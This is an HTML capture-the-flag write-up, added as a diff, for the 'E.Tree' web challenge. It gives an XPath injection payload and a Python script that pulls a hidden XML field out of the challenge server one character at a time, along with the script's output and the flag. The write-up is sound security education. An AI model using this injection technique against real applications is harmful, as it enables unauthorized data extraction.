@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>E.Tree</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav id="load-navbar"></nav>
+        <br />
+        <br />
+        <hr />    
+    </div>
+
+    <div id="tags">
+        <h5>Tags</h5>
+        <ul>
+            <li>xml</li>
+            <li>xpath</li>
+            <li>element tree</li>
+            <li>blind boolean-based exfiltration</li>
+        </ul>
+    </div>
+
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="ETree_0"></a>E.Tree</h1>
+<h2 class="code-line" data-line-start=1 data-line-end=2><a id="Description_1"></a>Description</h2>
+<p class="has-line-data" data-line-start="2" data-line-end="3">After many years where humans work under the aliens commands, they have been gradually given access to some of their management applications. Can you hack this alien Employ Directory web app and contribute to the greater human rebellion?</p>
+<h2 class="code-line" data-line-start=4 data-line-end=5><a id="Files_4"></a>Files</h2>
+<p class="has-line-data" data-line-start="5" data-line-end="6">Provided xml document with data.</p>
+<pre><code class="has-line-data" data-line-start="8" data-line-end="56" class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-title">district</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">"confidential"</span>&gt;</span>
+    
+        <span class="hljs-tag">&lt;<span class="hljs-title">staff</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">name</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">name</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">age</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">age</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">rank</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">rank</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">kills</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">kills</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-title">staff</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-title">staff</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">name</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">name</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">age</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">age</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">rank</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">rank</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">kills</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">kills</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-title">staff</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-title">staff</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">name</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">name</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">age</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">age</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">rank</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">rank</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">kills</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">kills</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">selfDestructCode</span>&gt;</span>CHTB{f4k3_fl4g<span class="hljs-tag">&lt;/<span class="hljs-title">selfDestructCode</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-title">staff</span>&gt;</span>
+        
+    <span class="hljs-tag">&lt;/<span class="hljs-title">district</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-title">district</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">"confidential"</span>&gt;</span>
+    
+        <span class="hljs-tag">&lt;<span class="hljs-title">staff</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">name</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">name</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">age</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">age</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">rank</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">rank</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">kills</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">kills</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-title">staff</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-title">staff</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">name</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">name</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">age</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">age</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">rank</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">rank</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">kills</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">kills</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">selfDestructCode</span>&gt;</span>_f0r_t3st1ng}<span class="hljs-tag">&lt;/<span class="hljs-title">selfDestructCode</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-title">staff</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-title">staff</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">name</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">name</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">age</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">age</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">rank</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">rank</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-title">kills</span>&gt;</span>confidential<span class="hljs-tag">&lt;/<span class="hljs-title">kills</span>&gt;</span>
+            
+        <span class="hljs-tag">&lt;/<span class="hljs-title">staff</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-title">district</span>&gt;</span>
+</code></pre>
+<h3 class="code-line" data-line-start=57 data-line-end=58><a id="Methodology_57"></a>Methodology</h3>
+<p class="has-line-data" data-line-start="58" data-line-end="59">We can ask the website to retrieve an alien commander (staff) from the <code>xml</code> document that is on the server. However in the <code>element tree</code> there is a hidden <code>tag</code> with the flag that we want. Since the webiste is using <code>xpath</code> to retrieve data from the document, we can exploit it to fetch other elements from the document.</p>
+<p class="has-line-data" data-line-start="60" data-line-end="62">Example request<br>
+<img src="./burp1.PNG" alt="burp1"></p>
+<p class="has-line-data" data-line-start="63" data-line-end="64">We have a boolean server answer (success, failure). We will use a special <code>xpath</code> query to exfiltrate the flag one char at the time (blind boolean-based).</p>
+<pre><code class="has-line-data" data-line-start="66" data-line-end="68" class="language-json">{"<span class="hljs-attribute">search</span>":<span class="hljs-value"><span class="hljs-string">"a'] or substring((//staff[position()=2]/selfDestructCode/text()),1,1)='4' or /staf[nam='a"</span></span>}
+</code></pre>
+<p class="has-line-data" data-line-start="69" data-line-end="70">This payload will go to the appropriate element and check if the first character of the element is a char <code>4</code>. We get a success so we are right. We bruteforce the remaining characters. The flag is divided into 2 parts. First part is on <code>position</code> 3 and the second part in on 2 (<code>position()</code>).</p>
+<h2 class="code-line" data-line-start=71 data-line-end=72><a id="Exploit_71"></a>Exploit</h2>
+<pre><code class="has-line-data" data-line-start="73" data-line-end="100" class="language-python"><span class="hljs-comment">#!/usr/bin/python3</span>
+
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> json
+
+st = <span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-./:;&lt;=&gt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7f403f">[email&#160;protected]</a>[]^_{|}~'</span>
+flg = <span class="hljs-string">''</span>
+
+<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">26</span>):
+  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(st)-<span class="hljs-number">1</span>):
+    <span class="hljs-comment"># first run</span>
+    data = {<span class="hljs-string">"search"</span>:<span class="hljs-string">"a'] or substring((//staff[position()=3]/selfDestructCode/text()),"</span> + str(k) + <span class="hljs-string">",1)='"</span> + str(st[i]) + <span class="hljs-string">"' or /staf[nam='a"</span>}
+
+    <span class="hljs-comment"># second run</span>
+    <span class="hljs-comment">#data = {"search":"a'] or substring((//staff[position()=2]/selfDestructCode/text())," + str(k) + ",1)='" + str(st[i]) + "' or /staf[nam='a"}</span>
+  
+    r = requests.post(<span class="hljs-string">'http://138.68.148.149:31179/api/search'</span>, json=data)
+    j = json.loads(r.content.decode())
+    
+    <span class="hljs-keyword">try</span>:
+      a = j[<span class="hljs-string">'success'</span>]
+      flg += str(st[i])
+      print(flg)
+      <span class="hljs-keyword">break</span>
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+      <span class="hljs-keyword">pass</span>
+</code></pre>
+<p class="has-line-data" data-line-start="101" data-line-end="102">After the first run (with position as 3).</p>
+<pre><code class="has-line-data" data-line-start="104" data-line-end="115">[REDACTED]
+CHTB{Th3_3xTr
+CHTB{Th3_3xTr4
+CHTB{Th3_3xTr4_
+CHTB{Th3_3xTr4_l
+CHTB{Th3_3xTr4_l3
+CHTB{Th3_3xTr4_l3v
+CHTB{Th3_3xTr4_l3v3
+CHTB{Th3_3xTr4_l3v3l
+CHTB{Th3_3xTr4_l3v3l_
+</code></pre>
+<p class="has-line-data" data-line-start="116" data-line-end="117">After the second run (with position as 2).</p>
+<pre><code class="has-line-data" data-line-start="118" data-line-end="126">[REDACTED]
+4Cc3s$_c0n
+4Cc3s$_c0nT
+4Cc3s$_c0nTr
+4Cc3s$_c0nTr0
+4Cc3s$_c0nTr0l
+4Cc3s$_c0nTr0l}
+</code></pre>
+<h2 class="code-line" data-line-start=127 data-line-end=128><a id="Flag_127"></a>Flag</h2>
+<p class="has-line-data" data-line-start="128" data-line-end="129"><strong>CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}</strong></p>
+
+    <script src="/js/navbar.js"></script>
+</body>
+
+</html>
